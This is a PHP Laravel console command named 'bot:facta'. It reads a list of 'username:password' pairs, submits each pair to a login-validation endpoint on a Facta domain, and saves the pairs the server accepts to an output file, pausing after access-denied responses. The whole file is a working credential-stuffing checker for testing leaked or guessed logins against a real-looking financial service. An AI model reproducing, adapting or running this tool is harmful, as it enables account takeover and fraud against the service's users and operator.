<?php

namespace App\Console\Commands\BOT;

use GuzzleHttp\Client;
use GuzzleHttp\Promise\Utils;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\Console\Helper\ProgressBar;

class Facta extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'bot:facta {--file=} {--output=} {--overwrite}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';


    private $handler_in;
    private $handler_out;
    private bool $overwrite = false;

    /**
     * Execute the console command.
     */
    public function handle()
    {
        // Prepare Guzzle Client
        $client = new Client([
            'base_uri' => "https://desenv.facta.com.br",
            'timeout' => 10.0,
            'headers' => [
                'Content-Type' => 'application/json',
                'Accept' => 'application/json',
            ],
        ]);

        $in = Storage::disk('in');

        $anticipate_files = $in->files();
        $filename_in = $this->option('file') ?? $this->anticipate('Por favor, selecione o arquivo a ser processado', $anticipate_files);

        if ($filename_in === null) {
            $this->error('Nenhum arquivo selecionado');
            return Command::FAILURE;
        }

        if (!$in->exists($filename_in)) {
            $this->error('Não foi possível encontrar o arquivo ' . $filename_in);
            return Command::FAILURE;
        }

        $out = Storage::disk('out');

        $filename_out = $this->option('output') ?? $this->ask('Por favor, informe o nome do arquivo de saída', 'output.csv');

        $path_in = $in->path($filename_in);
        $path_out = $out->path($filename_out);

        $this->overwrite = $this->option('overwrite');
        if ($out->exists($filename_out) && !$this->overwrite) {
            if (!($this->overwrite = $this->confirm('Deseja sobrescrever o arquivo de saída?'))) {
                return Command::FAILURE;
            }
        }

        $this->info("\n> Arquivo de entrada: {$filename_in}");
        $this->info("> Arquivo de saída: {$filename_out}");

        $this->handler_in = fopen($path_in, 'r');
        $this->handler_out = fopen($path_out, 'w');

        // Prepare Guzzle Promises
        $promises = [];

        $line = 0;

        while (($_data = fgetcsv($this->handler_in, 0, ';')) !== false) {
            $line++;
            $this->newLine();

            $data = explode(':', $_data[0]);
            $username = $data[0] ?? null;
            $password = $data[1] ?? null;
            if ($username === null || $password === null) {
                $this->error("Linha {$line} inválida: null:null");
                continue;
            }

            $this->line("[{$line}]: Processando {$username}");
            $hash = sha1($username . $password);
            $cache_tag = "BOT:FACTA:{$hash}";

            if (!Cache::has($cache_tag)) {
                try {
                    $response = $client->post('/sistemaNovo/ajax/validacao_acesso_classificacao_tiponegocio.php', [
                        'form_params' => [
                            'login' => $username,
                            'senha' => $password,
                        ],
                    ]);
                } catch (\Exception $e) {
                    $this->error("[{$line}]: Erro ao processar {$username}:{$password}.");
                    continue;
                }

                if ($response->getStatusCode() === 403) {
                    $this->error("[{$line}]: Acesso negado: {$username}:{$password}.");
                    $this->line("Aguardando 5 segundos para tentar novamente...");

                    sleep(5);
                    continue;
                }

                $data = Cache::remember($cache_tag, now()->addWeek(), function () use ($response) {
                    return json_decode($response->getBody()->getContents());
                });
            } else {
                $data = Cache::get($cache_tag);
            }


            if ($data->login_validado === 0) {
                $this->warn("[{$line}]: {$username}:{$password} inválido.");
                continue;
            }

            $this->info("[{$line}]: {$username}:{$password} válido.");
            // add user to output file
            fputcsv($this->handler_out, [$username, $password], ';');
        }

        fclose($this->handler_in);
        fclose($this->handler_out);

        $this->info("\n> Arquivo de saída gerado com sucesso: {$filename_out}");

        return Command::SUCCESS;
    }
}
